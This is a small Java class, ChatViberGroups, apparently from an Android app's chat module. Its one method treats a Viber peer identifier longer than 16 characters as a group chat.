package com.android.deviceinfo.module.chat;

public class ChatViberGroups extends ChatGroups {

	@Override
	boolean isGroup(String peer) {
		//return peer.startsWith("group");
		return peer.length() > 16;
	}

	
}
